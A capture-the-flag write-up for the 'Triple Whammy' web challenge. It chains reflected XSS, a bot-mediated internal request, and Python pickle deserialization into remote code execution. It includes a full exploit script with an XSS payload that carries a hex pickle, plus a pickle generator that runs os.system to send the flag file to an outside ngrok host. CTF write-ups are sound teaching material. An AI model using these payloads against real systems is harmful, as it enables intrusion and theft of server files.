## Triple Whammy

(46 solves)

Fun web challenge with XSS and insecure python deserialization that sends a bot on a long journey.

After an initial read-through, it seems that there are three applications running for this challenge.
* server.py - An externally accessible Flask web-server
* admin_bot.js - A frontend to a bot that can be sent to different locations, imitating an authenticated user
* internal.py - Another Flask web-server, only accessible internally (by the bot) which is given a random port between 5700 and 6000


 a bot we have to send to some
location, which indicates some kind of XSS vulnerability. The bot has a cookie set with a secret, with which it is authorized to access certain parts of the web-server that we are not authorized to.

```js 
// Relevant part of the bot's visitUrl:
...
    try {
        const page = await browser.newPage()

        try {
            await page.setUserAgent('puppeteer');
            let cookies = [{
                name: 'secret',
                value: SECRET,
                domain: '127.0.0.1',
                httpOnly: true
            }]
            await page.setCookie(...cookies)
            await page.goto(url, { timeout: 5000, waitUntil: 'networkidle2' })
        } finally {
            await page.close()
        }
...
```

```python
# Relevant function that checks the cookie and only proceeds
# if the bot visits it

@app.route('/query', methods=['POST'])
def query():
    print("Got request /query")
    print(f"Request json: {request.json}")
    # get "secret" cookie
    cookie = request.cookies.get('secret')

    check if cookie exists
    if cookie == None:
        return {"error": "Unauthorized"}
    
    # check if cookie is valid
    if cookie != SECRET:
        return {"error": "Unauthorized"}
    
    # get URL
    try:
        url = request.json['url']
    except:
        return {"error": "No URL provided"}

    # check if URL exists
    if url == None:
        return {"error": "No URL provided"}
    
    # check if URL is valid
    try:
        url_parsed = urlparse(url)
        if url_parsed.scheme not in ['http', 'https'] or url_parsed.hostname != '127.0.0.1':
            return {"error": "Invalid URL"}
    except:
        return {"error": "Invalid URL"}
    
    # request URL
    try:
        requests.get(url)
    except:
        return {"error": "Invalid URL"}
    
    return {"success": "Requested"}
```

But it doesn't help us to send the bot to some random url, we want the flag, which is
stored as a text file at `./flag.txt`. This means that we need some form of RCE.
Looking at the code of `internal.py`, we can see that we probably need to leverage [insecure deserialization](https://starlox.medium.com/insecure-deserialization-attack-with-python-pickle-2fd23ac5ff8f), as it simply unpickles what we give it as a json object.

```python
# Insecure deserialization vector in internal.py

@app.route('/pickle', methods=['GET'])
def main():
    pickle_bytes = request.args.get('pickle')

    if pickle_bytes is None:
        return 'No pickle bytes'
    
    try:
        b = bytes.fromhex(pickle_bytes)
    except:
        return 'Invalid hex'
    
    try:
        data = pickle.loads(b)
    except:
        return 'Invalid pickle'

    return str(data)
```

We would like to send the bot to `internal.py/pickle` directly, yet the bot frontend only allows
to send it to `server.py`. So we need to take a detour over the `server.py/query`. However,
`server.py/query` needs to be `POST`ed, so we need to leverage an XSS vector that is found in the last piece of the puzzel, the `/`-route:

```python
# Reflected XSS

@app.route('/', methods=['GET'])
def main():
    name = request.args.get('name','')

    return 'Nope still no front end, front end is for noobs '+name
```

Here we can see a reflected XSS vector in the name parameter. So the final attack path is:

* Send the bot to `/?name=<reflected XSS payload>` which sends a
* `POST`-request to `/query` with a json-body object containing a `url`-field, that sends it to
* `internal.py/pickle?pickle=<some hex encoded payload>` that gets deserialized and gives us RCE.

To get past the port randomization, we just brute-force it. Here is the code for the final attack:

```python
import requests
from tqdm import tqdm
from concurrent.futures import ThreadPoolExecutor

url = "https://triple-whammy-admin.chal.cyberjousting.com/visit"

def send_request(port):
    payload = {
        "path": f'''?name=<script>data%3d{{"url"%3a"http%3a//127.0.0.1%3a{port}/pickle%3fpickle%3d800495c5000000000000008c05706f736978948c0673797374656d9493948caa707974686f6e202d632022696d706f72742072657175657374733b20696d706f7274206f733b2072657175657374732e676574285c2268747470733a2f2f383937352d323030332d63642d633730632d626166362d646330632d646364302d393532392d653863342e6e67726f6b2d667265652e6170702f5c22202b206f732e706f70656e285c22636174202f6374662f666c61672e7478745c22292e726561642829292e74657874229485945294}}%3b+fetch("/query",+{{"method"%3a+"POST",+"headers"%3a+{{"Content-Type"%3a+"application/json"}},+"body"%3a+JSON.stringify(data)}})%3b</script>'''
    }
    response = requests.post(url, data=payload)
    return response.status_code  

num_threads = 10
ports = reversed(range(5700, 6000))

with ThreadPoolExecutor(max_workers=num_threads) as executor:
    results = list(tqdm(executor.map(send_request, ports), total=300))

print(results)

```

The deserialization-payload simply runs a python command that will send a `GET`-request to our ngrok endpoint with the flag `cat`ted at the end.

```python
import pickle
import sys
import base64

command = 'python -c "import requests; import os; requests.get(\\"https://8975-2003-cd-c70c-baf6-dc0c-dcd0-9529-e8c4.ngrok-free.app/\\" + os.popen(\\"cat /ctf/flag.txt\\").read()).text"'

class rce(object):
    def __reduce__(self):
        import os
        return (os.system,(command,))


print(pickle.dumps(rce()).hex())
```